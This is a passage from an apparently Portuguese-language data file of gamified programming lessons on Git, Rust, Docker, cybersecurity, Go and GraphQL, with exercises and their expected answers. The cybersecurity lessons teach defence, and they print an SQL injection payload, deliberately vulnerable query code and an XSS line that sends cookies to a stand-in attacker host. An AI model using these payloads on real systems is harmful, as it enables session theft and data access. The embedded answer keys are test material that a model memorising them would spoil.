            explanation: 'Trabalhar em branches de feature mantém a branch principal sempre estável e pronta para deploy, permitindo que a equipe revise o código através de Pull Requests.'
          },
          {
            type: 'code',
            instruction: 'Escreva o comando Git para criar e alternar simultaneamente para uma nova branch chamada feature/painel-laser.',
            initialCode: `# Digite o comando abaixo\n`,
            expectedKeywords: ['git checkout -b feature/painel-laser'],
            hint: 'Use git checkout -b seguido do nome da branch feature/painel-laser.',
            solution: `git checkout -b feature/painel-laser`
          }
        ]
      }
    ],
  },
  {
    id: 'rust',
    slug: 'rust',
    name: 'Rust',
    planetName: 'Cidadela de Ferro',
    description: 'Concorrência sem medo, alta performance e controle de memória com o revolucionário Borrow Checker.',
    icon: '🦀',
    color: '#DEA584',
    language: 'rust',
    level: 'Avançado',
    totalXp: 130,
    lessons: [
      {
        id: 'rust-1',
        title: '1. O Reinado do Ownership & Borrowing',
        description: 'Domine a gestão de memória segura sem garbage collector e as regras de empréstimo do Rust.',
        duration: 16,
        xpReward: 65,
        language: 'rust',
        content: `# 🦀 O Reinado do Ownership & Borrowing na Cidadela de Ferro

Bem-vindo à **Cidadela de Ferro**, cadete! No universo dos sistemas críticos — de motores de foguetes a navegadores de alta performance — vazamentos de memória ou ponteiros soltos causam destruição total.

O **Rust**, eleito a linguagem mais amada pelos desenvolvedores por quase uma década, resolveu o maior dilema da computação: **como ter a velocidade do C++ com 100% de segurança de memória?** A resposta é o **Ownership** (Posse).

---

### 🛡️ As Três Leis Sagradas do Ownership

1. Cada valor em Rust tem um único dono (uma variável).
2. Só pode haver um único dono por vez.
3. Quando o dono sai do escopo (\`}\`), o valor é destruído e a memória é liberada automaticamente através da função \`drop\`.

\`\`\`rust
{
    let msg = String::from("Sinal de Dobra"); // msg é dona da string
    // usamos msg aqui...
} // Aqui o escopo fecha e msg é liberada da memória imediatamente!
\`\`\`

---

### 🤝 Empréstimos (Borrowing): Referências Imutáveis e Mutáveis

Em vez de transferir a posse definitiva de um dado toda vez que chamamos uma função (o que chamamos de *Move*), nós **emprestamos** o valor usando referências:

- **Referência Imutável (\`&T\`):** Permite leitura sem transferir posse. Você pode ter infinitas referências imutáveis ao mesmo tempo:
  \`\`\`rust
  fn calcular_tamanho(texto: &String) -> usize {
      texto.len()
  }
  \`\`\`
- **Referência Mutável (\`&mut T\`):** Permite alterar o valor emprestado. Regra de ouro: **só pode haver uma única referência mutável por vez** para evitar corridas de dados (*data races*)!

> **💡 Dica Pro:**
> Por padrão, todas as variáveis em Rust são **imutáveis**. Se você planeja alterar o valor de uma variável ao longo do tempo, declare-a explicitamente com \`let mut valor = 10;\`.

> **⚠️ Armadilha Comum:**
> Tentar acessar uma variável após ela ter sido movida para outra função gera o erro \`use of moved value\`. Para manter o acesso, passe uma referência usando o \`&\` na frente!`,
        codeExample: `// Demonstração de Empréstimo Seguro em Rust
fn main() {
    let mut blindagem = 100;
    
    // Passando referência mutável para reparar o escudo
    reparar_escudo(&mut blindagem);
    println!("Nível da blindagem reparada: {}%", blindagem);
}

fn reparar_escudo(nivel: &mut i32) {
    *nivel += 25;
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual das alternativas descreve corretamente a regra do Borrow Checker do Rust sobre referências concorrentes?',
            options: [
              'Você pode ter quantas referências mutáveis quiser ao mesmo tempo sem restrições.',
              'Você pode ter múltiplas referências imutáveis (&) OU exatamente uma única referência mutável (&mut) por vez, prevenindo corridas de dados.',
              'Referências em Rust exigem a instalação de um Garbage Collector no servidor.',
              'Empréstimos de memória são proibidos em funções públicas.'
            ],
            correctIndex: 1,
            explanation: 'Essa regra matemática impede corridas de dados (data races) em tempo de compilação: enquanto alguém altera o dado com &mut, ninguém mais pode ler ou escrever nele simultaneamente.'
          },
          {
            type: 'fillblank',
            title: 'Assinando o Empréstimo Imutável',
            instruction: 'Complete a função para receber uma referência de leitura de uma String sem tomar posse definitiva dela.',
            codeSnippet: `fn inspecionar_modulo(nome: {{simbolo_referencia}}String) {
    println!("Inspecionando módulo: {}", nome);
}`,
            blanks: [
              {
                id: 'simbolo_referencia',
                placeholder: 'símbolo de referência',
                expectedValues: ['&'],
                hint: 'Caractere único ("e comercial") que cria uma referência de empréstimo em Rust.'
              }
            ],
            explanation: 'Perfeito! O símbolo & empresta o valor sem tomar posse, permitindo que a variável original continue utilizável após a função.'
          },
          {
            type: 'bughunt',
            title: 'Mutabilidade Não Declarada',
            scenario: 'O compilador rustc emitiu o erro "cannot mutate immutable variable `escudos`" na Cidadela de Ferro.',
            buggyCode: `fn main() {
    let escudos = 80;
    escudos = escudos + 20;
    println!("Escudos: {}", escudos);
}`,
            expectedKeywords: ['let mut escudos = 80;'],
            forbiddenKeywords: ['let escudos = 80;'],
            hint: 'Variáveis em Rust são imutáveis por padrão. Adicione a palavra-chave mut logo após let.',
            solutionExplanation: 'Excelente depuração! Com let mut escudos = 80;, a variável ganha autorização para reatribuição.'
          }
        ]
      },
      {
        id: 'rust-2',
        title: '2. Robustez Sem Null: Option, Result & Pattern Matching',
        description: 'Elimine exceções não tratadas com os enums Option e Result e desempacotamento exaustivo com match.',
        duration: 17,
        xpReward: 65,
        language: 'rust',
        content: `# 🛡️ Robustez Sem Null: Option, Result & Pattern Matching

Sir Tony Hoare, criador da referência nula em 1965, chamou publicamente a invenção do \`null\` de seu **"erro de um bilhão de dólares"** devido à quantidade incontável de falhas e vulnerabilidades que ela causou na história do software.

O Rust tomou uma decisão radical: **o valor \`null\` simplesmente não existe em Rust**!

---

### 📦 O Enum \`Option<T>\`: Presença ou Ausência

Quando um dado pode ou não existir (por exemplo, buscar um usuário por ID no banco), Rust usa o enum nativo:

\`\`\`rust
enum Option<T> {
    Some(T), // Contém o valor existente
    None,    // Ausência do valor
}
\`\`\`

---

### ⚠️ O Enum \`Result<T, E>\`: Sucesso ou Falha

Para operações que podem falhar (leitura de arquivos, rede, conversões numéricas):

\`\`\`rust
enum Result<T, E> {
    Ok(T),  // Operação concluída com sucesso
    Err(E), // Falhou com um erro tipado
}
\`\`\`

---

### 🎯 Desempacotamento Exaustivo com \`match\`

O compilador exige que você cubra **todos os cenários possíveis**. É impossível esquecer de tratar um erro:

\`\`\`rust
fn disparar_sensor(status: Option<i32>) {
    match status {
        Some(potencia) => println!("Sensor calibrado em {}%", potencia),
        None => println!("Sensor desconectado!"),
    }
}
\`\`\`

> **💡 Dica Pro:**
> Quando quiser apenas propagar um erro para quem chamou a função de forma enxuta, use o operador de interrogação \`?\`: \`let arquivo = File::open("log.txt")?;\`.

> **⚠️ Armadilha Comum:**
> Usar o método \`.unwrap()\` sem cuidado força a extração do valor e trava o programa com um *panic* se o resultado for \`None\` ou \`Err\`. Em produção, prefira sempre \`match\` ou \`if let\`.`,
        codeExample: `// Leitura e Tratamento Exaustivo em Rust
fn ler_frequencia(canal: i32) -> Result<f64, String> {
    if canal > 0 && canal <= 100 {
        Ok(1420.405) // Frequência do hidrogênio interestelar
    } else {
        Err(String::from("Canal fora do espectro detectável."))
    }
}

fn main() {
    match ler_frequencia(42) {
        Ok(freq) => println!("Frequência captada: {} MHz", freq),
        Err(erro) => println!("Falha de sintonia: {}", erro),
    }
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual é o enum padrão da linguagem Rust utilizado para representar operações que podem ser bem-sucedidas (Ok) ou falhar com um erro (Err)?',
            options: [
              'TryCatch<T>',
              'Result<T, E>',
              'Nullable<T>',
              'ExceptionBlock<E>'
            ],
            correctIndex: 1,
            explanation: 'Result<T, E> é o enum soberano de tratamento de erros em Rust, encapsulando Ok(valor) ou Err(erro) sem necessidade de exceções em tempo de execução.'
          },
          {
            type: 'code',
            instruction: 'Escreva uma estrutura match para a variável opcao (do tipo Option<i32>) que retorne o valor val no braço Some(val) e 0 no braço None.',
            initialCode: `// Considere que a variável "opcao" já existe
// Complete o match abaixo
match opcao {\n`,
            expectedKeywords: ['match opcao', 'Some(val) => val', 'None => 0'],
            hint: 'Escreva: match opcao { Some(val) => val, None => 0 }.',
            solution: `match opcao {
    Some(val) => val,
    None => 0,
}`
          }
        ]
      }
    ]
  },
  {
    id: 'docker',
    slug: 'docker',
    name: 'Docker',
    planetName: 'Estação Orbital Docker',
    description: 'Empacote aplicações em cápsulas autônomas, imutáveis e portáteis. O fim do "na minha máquina funciona!".',
    icon: '🐳',
    color: '#2496ED',
    language: 'dockerfile',
    level: 'Intermediário',
    totalXp: 130,
    lessons: [
      {
        id: 'docker-1',
        title: '1. O Fim do "Na Minha Máquina Funciona": Imagens & Containers',
        description: 'Entenda a revolução dos containers, a diferença para máquinas virtuais e comandos fundamentais.',
        duration: 15,
        xpReward: 65,
        language: 'bash',
        content: `# 🐳 Imagens & Containers na Estação Orbital Docker

Quantas vezes você já ouviu a frase clássica: *"Ué, mas na minha máquina funciona!"*?

Diferenças de versão de Node, bibliotecas do sistema operacional e configurações de ambiente sempre foram pesadelos para equipes de software. O **Docker** resolveu isso criando **containers**: cápsulas isoladas e portáteis que rodam com o mesmo comportamento exato em qualquer lugar.

---

### 📦 Container vs Máquina Virtual (VM)

- **Máquinas Virtuais:** Cada VM precisa de um sistema operacional convidado (*Guest OS*) completo de vários gigabytes e inicialização lenta.
- **Containers Docker:** Compartilham o mesmo Kernel do sistema hospedeiro, isolando apenas os processos. Por isso iniciam em **milissegundos** e gastam pouquíssima memória RAM!

---

### 🖼️ Imagem vs Container

- **Imagem:** É a receita estática e imutável (como a planta de uma nave espacial).
- **Container:** É a instância viva em execução criada a partir da imagem (a nave voando no espaço).

---

### 🚀 Comandos Essenciais do Terminal

\`\`\`bash
# 1. Baixar e executar um container em segundo plano com portas mapeadas
docker run -d -p 8080:80 --name servidor-web nginx

# 2. Listar containers que estão rodando no momento
docker ps

# 3. Parar um container em execução
docker stop servidor-web

# 4. Ver os logs gerados pela aplicação dentro do container
docker logs servidor-web
\`\`\`

> **💡 Dica Pro:**
> A flag \`-p 8080:80\` mapeia a **porta 8080 da sua máquina real (Host)** para a **porta 80 interna do container**. Se você esquecer essa flag, a aplicação roda, mas você não consegue acessá-la no navegador!

> **⚠️ Armadilha Comum:**
> Esquecer a flag \`-d\` (*detached mode*) faz o container rodar preso ao seu terminal atual, bloqueando o prompt.`,
        codeExample: `# Subindo um Banco de Dados PostgreSQL no Docker em 5 segundos
docker run -d \\
  --name postgres-nexus \\
  -e POSTGRES_PASSWORD=segredo \\
  -p 5432:5432 \\
  postgres:15-alpine`,
        exercises: [
          {
            type: 'quiz',
            question: 'O que faz o parâmetro "-p 3000:80" no comando "docker run -p 3000:80 meu-app"?',
            options: [
              'Limita o uso de memória do container para 3000 megabytes.',
              'Mapeia a porta 3000 do computador host para a porta 80 interna do container.',
              'Executa 3000 cópias simultâneas da aplicação.',
              'Define a senha de administrador do container como 3000.'
            ],
            correctIndex: 1,
            explanation: 'A sintaxe de portas no Docker é sempre -p PORTA_DO_HOST:PORTA_INTERNA_DO_CONTAINER, redirecionando o tráfego de rede entre a máquina física e a aplicação encapsulada.'
          },
          {
            type: 'fillblank',
            title: 'Executando o Servidor Desacoplado',
            instruction: 'Complete o comando docker para rodar o container em segundo plano (detached mode) e mapear a porta 80.',
            codeSnippet: `docker run -{{flag_background}} -p 80:80 --name servidor_nexus nginx`,
            blanks: [
              {
                id: 'flag_background',
                placeholder: 'flag de segundo plano',
                expectedValues: ['d'],
                hint: 'Letra única que ativa o Detached Mode (segundo plano).'
              }
            ],
            explanation: 'Perfeito! A flag -d libera seu terminal imediatamente enquanto o container segue operando em background.'
          }
        ]
      },
      {
        id: 'docker-2',
        title: '2. A Receita Espacial: Construindo Dockerfiles',
        description: 'Crie suas próprias imagens Docker profissionais com cache de camadas e boas práticas de build.',
        duration: 16,
        xpReward: 65,
        language: 'dockerfile',
        content: `# 📜 Construindo Dockerfiles Profissionais

Para empacotar a sua própria aplicação dentro de uma imagem Docker, você escreve um arquivo de instruções chamado **\`Dockerfile\`**.

---

### 🧱 Anatomia de um Dockerfile para Node.js

\`\`\`dockerfile
# 1. Imagem base oficial do Node.js leve (versão alpine)
FROM node:18-alpine

# 2. Diretório de trabalho dentro do container
WORKDIR /app

# 3. Copiar manifestos de dependências primeiro (otimização de cache!)
COPY package*.json ./

# 4. Instalar dependências
RUN npm install --production

# 5. Copiar o restante do código fonte
COPY . .

# 6. Informar qual porta o container escuta
EXPOSE 3000

# 7. Comando padrão para ligar o servidor
CMD ["node", "server.js"]
\`\`\`

---

### ⚡ O Segredo do Cache de Camadas (*Layer Caching*)

Cada instrução (\`RUN\`, \`COPY\`, \`WORKDIR\`) cria uma camada imutável no Docker.
- Se o seu código mudar, mas suas dependências continuarem iguais, o Docker reutiliza o cache do \`npm install\`!
- Por isso, copiamos o \`package.json\` antes de copiar todo o código (\`COPY . .\`). Isso reduz o tempo de deploy de minutos para segundos!

> **💡 Dica Pro:**
> Crie sempre um arquivo \`.dockerignore\` excluindo a pasta \`node_modules\` e arquivos \`.env\`. Isso impede que pastas pesadas locais poluam o build da imagem.

> **⚠️ Armadilha Comum:**
> Confundir \`RUN\` com \`CMD\`. O \`RUN\` é executado **durante a construção da imagem** (ex: instalar pacotes). O \`CMD\` é executado **quando o container é ligado**!`,
        codeExample: `# Dockerfile Otimizado para Produção
FROM node:20-alpine
WORKDIR /usr/src/app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
EXPOSE 8080
CMD ["npm", "start"]`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual instrução do Dockerfile é responsável por definir qual imagem de partida oficial será utilizada como base do container?',
            options: [
              'ORIGIN',
              'FROM',
              'BASE_IMAGE',
              'IMPORT'
            ],
            correctIndex: 1,
            explanation: 'Todo Dockerfile começa com a instrução FROM especificando a imagem base (ex: FROM node:18-alpine ou FROM python:3.11-slim).'
          },
          {
            type: 'code',
            instruction: 'Escreva um Dockerfile básico iniciando com a imagem base node:18-alpine, definindo o diretório de trabalho /app e o comando de inicialização CMD ["node", "app.js"].',
            initialCode: `# Escreva as instruções do Dockerfile abaixo\n`,
            expectedKeywords: ['FROM node:18-alpine', 'WORKDIR /app', 'CMD ["node", "app.js"]'],
            hint: 'Escreva: FROM node:18-alpine, depois WORKDIR /app e finalize com CMD ["node", "app.js"].',
            solution: `FROM node:18-alpine
WORKDIR /app
CMD ["node", "app.js"]`
          }
        ]
      }
    ]
  },
  {
    id: 'ciberseguranca',
    slug: 'ciberseguranca',
    name: 'Cibersegurança',
    planetName: 'Shadow Grid',
    description: 'Aprenda as técnicas dos hackers éticos: blindagem contra invasões, OWASP Top 10 e proteção de dados.',
    icon: '🛡️',
    color: '#00E5FF',
    language: 'javascript',
    level: 'Intermediário',
    totalXp: 130,
    lessons: [
      {
        id: 'sec-1',
        title: '1. O Vetor de Invasão: SQL Injection & Sanitização',
        description: 'Descubra como ataques de injeção funcionam e como blindar sistemas com Prepared Statements.',
        duration: 16,
        xpReward: 65,
        language: 'sql',
        content: `# 🛡️ SQL Injection & Sanitização na Shadow Grid

Bem-vindo à **Shadow Grid**, a divisão de defesa cibernética e operações de segurança ética do Nexus!

Dentre todas as ameaças catalogadas pela fundação **OWASP** (*Open Web Application Security Project*), o **SQL Injection** foi a vulnerabilidade que causou os maiores vazamentos de bancos de dados da história da internet.

---

### 💣 A Anatomia do Ataque

Imagine um backend ingênuo que monta a consulta SQL concatenando diretamente o que o usuário digita no campo de login:

\`\`\`javascript
// ❌ CÓDIGO VULNERÁVEL:
const query = "SELECT * FROM usuarios WHERE email = '" + emailDigitado + "'";
\`\`\`

Se um atacante digitar no campo de e-mail o seguinte payload:
\`\`\`text
' OR '1'='1
\`\`\`

A consulta final executada no banco de dados se transforma em:
\`\`\`sql
SELECT * FROM usuarios WHERE email = '' OR '1'='1'
\`\`\`
Como \`'1'='1'\` é sempre verdadeiro, o banco devolve **todos os usuários da aplicação**, garantindo acesso irrestrito ao invasor sem senha!

---

### 🛡️ O Antídoto: Prepared Statements (Consultas Parametrizadas)

A regra de ouro da cibersegurança: **nunca confie na entrada do usuário**.

Com **Prepared Statements**, o banco de dados compila o comando SQL primeiro, e os dados do usuário são enviados separadamente como parâmetros puros. O texto digitado jamais será interpretado como instrução SQL:

\`\`\`javascript
// ✅ CÓDIGO BLINDADO COM PARÂMETROS ($1, $2 ou ?):
const query = "SELECT * FROM usuarios WHERE email = $1 AND senha_hash = $2";
await db.query(query, [emailDigitado, hashCalculado]);
\`\`\`

> **💡 Dica Pro:**
> ORMs e bibliotecas modernas (como Prisma, Supabase, Drizzle, Hibernate) já utilizam Prepared Statements nativamente por baixo dos panos, protegendo você por padrão.

> **⚠️ Armadilha Comum:**
> Fazer validação de segurança apenas no frontend (formulário HTML ou React) não protege nada! O atacante pode enviar requisições diretas via terminal usando \`curl\` ignorando completamente suas travas visuais.`,
        codeExample: `// Autenticação Segura Contra Injeção SQL
import { pool } from './database';

async function autenticarCadete(email, senhaHash) {
  // O parâmetro $1 isola os dados de qualquer tentativa de injeção
  const resultado = await pool.query(
    'SELECT id, username, role FROM users WHERE email = $1 AND password_hash = $2',
    [email, senhaHash]
  );
  return resultado.rows[0] || null;
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Por que o uso de Consultas Parametrizadas (Prepared Statements) impede com eficácia ataques de SQL Injection?',
            options: [
              'Porque criptografa o banco de dados com uma chave militar de 512 bits.',
              'Porque separa o código SQL estrutural dos dados de entrada, garantindo que o texto do usuário seja tratado estritamente como dado literal e nunca como comando executável.',
              'Porque impede que o usuário digite caracteres especiais no teclado.',
              'Porque fecha as portas de rede do servidor enquanto a busca é realizada.'
            ],
            correctIndex: 1,
            explanation: 'Nas Prepared Statements, o motor do banco de dados compila o plano de execução antes de receber os valores, impossibilitando que comandos maliciosos injetados alterem a lógica da consulta.'
          },
          {
            type: 'bughunt',
            title: 'Injeção SQL Crítica no Login',
            scenario: 'A auditoria de segurança da Shadow Grid detectou uma falha grave: o desenvolvedor concatenou a variável de e-mail com o operador + na string de busca.',
            buggyCode: `function buscarUsuario(email) {
  const query = "SELECT * FROM users WHERE email = '" + email + "'";
  return db.execute(query);
}`,
            expectedKeywords: ['db.execute("SELECT * FROM users WHERE email = $1", [email]);'],
            forbiddenKeywords: ['WHERE email = \'\" + email + \"\''],
            hint: 'Substitua a concatenação direta por uma consulta parametrizada usando $1 como placeholder e passe [email] no array de parâmetros.',
            solutionExplanation: 'Vulnerabilidade erradicada! Ao parametrizar a busca com $1, qualquer payload malicioso digitado será tratado apenas como texto inofensivo.'
          }
        ]
      },
      {
        id: 'sec-2',
        title: '2. Blindagem de Aplicações: XSS & Hashing de Senhas',
        description: 'Impeça a injeção de scripts no navegador e proteja credenciais com algoritmos de hash como bcrypt.',
        duration: 17,
        xpReward: 65,
        language: 'javascript',
        content: `# 🔒 XSS & Criptografia de Credenciais

Após proteger a camada de banco de dados, devemos blindar a interface e o cofre de credenciais contra as duas técnicas mais comuns de roubo de sessão: **XSS** e **senhas vazadas**.

---

### 🕷️ O que é XSS (Cross-Site Scripting)?

Ocorre quando dados fornecidos por usuários são renderizados na tela sem sanitização, permitindo a execução de JavaScript malicioso no navegador de outras pessoas:

\`\`\`html
<!-- Se o perfil do invasor for este payload: -->
<script>fetch('https://hacker.io/steal?cookie=' + document.cookie)</script>
\`\`\`

Se o site injetar esse texto usando \`innerHTML\` ou \`dangerouslySetInnerHTML\`, o script roda silenciosamente e envia os cookies da vítima direto para o servidor do hacker!

**Como prevenir:**
1. Sempre use \`textContent\` em vez de \`innerHTML\` no JavaScript nativo.
2. Armazene tokens de autenticação em cookies com a flag **\`HttpOnly\`** (que impede que qualquer código JavaScript leia o cookie).

---

### 🔑 Nunca Salve Senhas em Texto Puro!

Se o banco de dados for comprometido, senhas em texto puro expõem todos os usuários imediatamente. Também nunca use MD5 ou SHA256 puro (são rápidos demais e vulneráveis a tabelas de busca *Rainbow Tables*).

A indústria exige **algoritmos com Salt e fator de custo** como **bcrypt** ou **Argon2**:

\`\`\`javascript
import bcrypt from 'bcrypt';

// 1. Gerando o hash seguro com 12 rodadas de salt
const senhaDigitada = "senha_secreta_123";
const hashSeguro = await bcrypt.hash(senhaDigitada, 12);

// 2. Comparando a senha informada no login com o hash do banco
const senhaValida = await bcrypt.compare(senhaDigitada, hashSeguro);
\`\`\`

> **💡 Dica Pro:**
> O *Salt* é uma sequência aleatória única adicionada à senha antes do hash. Ele garante que dois usuários com a mesma senha tenham hashes completamente diferentes no banco!

> **⚠️ Armadilha Comum:**
> Tratar criptografia reversível e hashing como a mesma coisa. Criptografia pode ser decodificada de volta; um Hash seguro é uma via de mão única matemática que nunca pode ser revertida.`,
        codeExample: `// Exemplo de Hash de Senha com Bcrypt
import bcrypt from 'bcrypt';

export async function registrarCadeteSeguro(email, senhaPlana) {
  const SALT_ROUNDS = 12;
  const hash = await bcrypt.hash(senhaPlana, SALT_ROUNDS);
  
  // Gravamos apenas o hash no banco, NUNCA a senha pura!
  return await salvarNoBanco({ email, senha_hash: hash });
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual configuração de cookie do navegador é a mais eficaz para impedir que ataques do tipo Cross-Site Scripting (XSS) consigam roubar o token de sessão do usuário?',
            options: [
              'Definir a cor do cookie como verde.',
              'Ativar a flag HttpOnly, tornando o cookie inacessível para leitura via scripts JavaScript (document.cookie).',
              'Reduzir o tamanho do cookie para menos de 10 bytes.',
              'Salvar o cookie na pasta de downloads do usuário.'
            ],
            correctIndex: 1,
            explanation: 'A flag HttpOnly instrui o navegador a anexar o cookie nas requisições HTTP, mas bloqueia terminantemente qualquer acesso a ele via document.cookie pelo JavaScript da página.'
          },
          {
            type: 'fillblank',
            title: 'Verificando a Senha Criptografada',
            instruction: 'Preencha o método da biblioteca bcrypt utilizado para verificar se a senha digitada confere com o hash salvo.',
            codeSnippet: `const ehValida = await bcrypt.{{metodo_comparacao}}(senhaDigitada, hashSalvo);`,
            blanks: [
              {
                id: 'metodo_comparacao',
                placeholder: 'método de comparação',
                expectedValues: ['compare'],
                hint: 'Palavra em inglês que significa "comparar".'
              }
            ],
            explanation: 'Perfeito! bcrypt.compare() desfaz o salt e compara a senha em tempo constante, prevenindo inclusive ataques de temporização (Timing Attacks).'
          }
        ]
      }
    ]
  },
  {
    id: 'golang',
    slug: 'golang',
    name: 'Go',
    planetName: 'Núcleo Supersônico',
    description: 'A linguagem criada no Google para microsserviços ultrarrápidos, concorrência nativa e alta escala.',
    icon: '🐹',
    color: '#00ADD8',
    language: 'go',
    level: 'Intermediário',
    totalXp: 130,
    lessons: [
      {
        id: 'go-1',
        title: '1. Simplicidade Supersônica: Tipos & Funções em Go',
        description: 'Conheça o design enxuto do Go, declaração rápida := e o padrão explícito de retorno de erros.',
        duration: 15,
        xpReward: 65,
        language: 'go',
        content: `# 🐹 Simplicidade Supersônica no Núcleo Go

Bem-vindo ao **Núcleo Supersônico**, cadete! Quando os pioneiros da computação Ken Thompson e Rob Pike projetaram a linguagem **Go** (Golang) dentro do Google em 2009, o objetivo era claro: **eliminar o inchaço e a lentidão dos sistemas de grande escala**.

Go é a linguagem que move as maiores ferramentas de infraestrutura do mundo moderno: **Docker, Kubernetes, Terraform e Prometheus** são todos escritos em Go!

---

### ⚡ Características Marcantes do Go

1. **Compilação Relâmpago:** Compila diretamente para um binário executável nativo único sem runtimes externos pesados.
2. **Sintaxe Limpa & Enxuta:** Não há classes, herança complexa nem exceções escondidas.
3. **Declaração Curta com Inferência (\`:=\`):**
   \`\`\`go
   nomeNave := "Gopher-1" // Go já sabe que é do tipo string!
   velocidadeDobra := 9.9
   \`\`\`

---

### 🔀 Múltiplos Retornos & Tratamento Explícito de Erros

Em Go, funções podem retornar múltiplos valores simultaneamente. Por convenção universal, o último valor retornado é o erro:

\`\`\`go
func carregarSensor(id int) (string, error) {
    if id <= 0 {
        return "", errors.New("identificador de sensor inválido")
    }
    return "SENSOR_ONLINE", nil
}
\`\`\`

Para tratar a chamada:
\`\`\`go
status, err := carregarSensor(10)
if err != nil {
    log.Fatal("Falha crítica:", err)
}
fmt.Println("Sensor pronto:", status)
\`\`\`

> **💡 Dica Pro:**
> O compilador do Go é inflexível por design: se você importar um pacote ou declarar uma variável e não utilizá-la no código, o Go recusa-se a compilar! Isso mantém o código de produção impecavelmente limpo.

> **⚠️ Armadilha Comum:**
> Tentar usar o operador \`:=\` fora do corpo de uma função. No escopo global do pacote, deve-se usar a palavra-chave \`var\`.`,
        codeExample: `// Programa Canônico em Go
package main

import (
    "fmt"
    "errors"
)

func dividirEnergia(total int, divisores int) (int, error) {
    if divisores == 0 {
        return 0, errors.New("divisão por zero impossível no reator")
    }
    return total / divisores, nil
}

func main() {
    resultado, err := dividirEnergia(100, 4)
    if err != nil {
        fmt.Println("Erro:", err)
        return
    }
    fmt.Printf("Energia por propulsor: %d MW\\n", resultado)
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual é o padrão oficial e idiomático da linguagem Go para lidar com falhas e erros em funções?',
            options: [
              'Lançar exceções com a palavra-chave throw e capturar com blocos try/catch.',
              'Retornar o erro explicitamente como o último valor do retorno da função e checá-lo com "if err != nil".',
              'O compilador Go proíbe qualquer tipo de erro de acontecer.',
              'Escrever todos os erros em um arquivo .log oculto sem avisar o chamador.'
            ],
            correctIndex: 1,
            explanation: 'Go não utiliza try/catch. Em vez disso, funções retornam (valor, error) e o desenvolvedor verifica explicitamente if err != nil, garantindo que nenhum erro passe despercebido.'
          },
          {
            type: 'fillblank',
            title: 'Declarando Variáveis com Inferência Rápida',
            instruction: 'Preencha o operador de declaração curta de variáveis idiomático do Go.',
            codeSnippet: `piloto {{operador_curto}} "Comandante Lynx"`,
            blanks: [
              {
                id: 'operador_curto',
                placeholder: 'operador curto',
                expectedValues: [':='],
                hint: 'Combinação de dois pontos e igual usada para declarar e inferir tipo em Go.'
              }
            ],
            explanation: 'Perfeito! O operador := declara a variável e infere o tipo string automaticamente em tempo de compilação.'
          }
        ]
      },
      {
        id: 'go-2',
        title: '2. Concorrência Hiperespacial: Goroutines & Channels',
        description: 'Execute milhões de tarefas simultâneas com goroutines leves e canais de comunicação seguros.',
        duration: 17,
        xpReward: 65,
        language: 'go',
        content: `# 🚀 Goroutines & Channels: Concorrência Hiperespacial

Enquanto a maioria das linguagens briga com threads pesadas do sistema operacional (onde criar mil threads esgota a memória do servidor), Go foi projetado desde o primeiro dia para **concorrência massiva**.

---

### 💨 O que é uma Goroutine?

Uma **Goroutine** é uma thread gerenciada pelo próprio runtime do Go, e não pelo sistema operacional.
- Uma thread tradicional consome cerca de **1 MB** de memória.
- Uma Goroutine consome apenas **2 KB**! Você pode rodar **centenas de milhares** de Goroutines simultâneas no mesmo servidor sem engasgar.

Para transformar qualquer função em uma tarefa concorrente:
\`\`\`go
go dispararPropulsor("Motor Alpha") // Executa em paralelo instantaneamente!
\`\`\`

---

### 📬 Channels: Comunicação Sem Conflitos

O lema sagrado do Go é:  
> *"Não se comunique compartilhando memória; compartilhe memória se comunicando."*

Para transferir dados com segurança entre diferentes Goroutines sem precisar de travas complexas (*mutex*), usamos **Channels** (Canais):

\`\`\`go
// 1. Criar um canal de strings
mensagens := make(chan string)

// 2. Enviar dado para o canal dentro de uma goroutine
go func() {
    mensagens <- "Sinal de Dobra Recebido!" // Operador <- empurra o dado
}()

// 3. Receber o dado no processo principal
resultado := <-mensagens // Operador <- extrai o dado
fmt.Println(resultado)
\`\`\`

> **💡 Dica Pro:**
> O envio e o recebimento em canais não-bufferizados bloqueiam a execução até que o outro lado esteja pronto. Isso cria uma sincronização perfeita automática entre tarefas assíncronas!

> **⚠️ Armadilha Comum:**
> Tentar ler de um canal onde nenhuma Goroutine está mais escrevendo nem o canal foi fechado gera um erro fatal em tempo de execução: \`fatal error: all goroutines are asleep - deadlock!\`.`,
        codeExample: `// Processando Telemetria Concorrente em Go
package main

import "fmt"

func escanearSetor(setor int, canal chan string) {
    canal <- fmt.Sprintf("Setor %d mapeado com sucesso!", setor)
}

func main() {
    telemetria := make(chan string)

    // Dispara 3 escaneamentos em paralelo
    go escanearSetor(1, telemetria)
    go escanearSetor(2, telemetria)
    go escanearSetor(3, telemetria)

    // Coleta as 3 respostas
    for i := 0; i < 3; i++ {
        fmt.Println(<-telemetria)
    }
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'O que a palavra-chave "go" faz quando colocada antes da chamada de uma função (ex: go coletarDados())?',
            options: [
              'Converte a função em um arquivo PDF para download.',
              'Inicia a execução da função em segundo plano de forma concorrente em uma nova Goroutine.',
              'Compila a função para a linguagem C.',
              'Cancela a execução de todas as outras funções do programa.'
            ],
            correctIndex: 1,
            explanation: 'A palavra go inicia uma Goroutine imediatamente, permitindo que a função execute em paralelo de maneira ultraleve sem bloquear a thread principal.'
          },
          {
            type: 'code',
            instruction: 'Escreva a linha de código em Go para criar um canal síncrono de inteiros chamado canalNumeros usando a função make.',
            initialCode: `// Crie o canal abaixo\n`,
            expectedKeywords: ['canalNumeros := make(chan int)'],
            hint: 'Use a sintaxe: canalNumeros := make(chan int).',
            solution: `canalNumeros := make(chan int)`
          }
        ]
      }
    ]
  },
  {
    id: 'graphql',
    slug: 'graphql',
    name: 'GraphQL',
    planetName: 'Matriz Conectiva',
    description: 'A linguagem de consulta para APIs criada pelo Meta. Peça exatamente os dados que precisa, nada mais, nada menos.',
    icon: '🔮',
    color: '#E10098',
    language: 'graphql',
    level: 'Intermediário',
    totalXp: 130,
    lessons: [
      {
        id: 'graphql-1',
        title: '1. O Fim do Over-fetching: Consultas Declarativas',
        description: 'Diga adeus a múltiplos endpoints e payloads gigantes. Peça apenas os campos necessários na tela.',
        duration: 15,
        xpReward: 65,
        language: 'graphql',
        content: `# 🔮 O Fim do Over-fetching na Matriz Conectiva

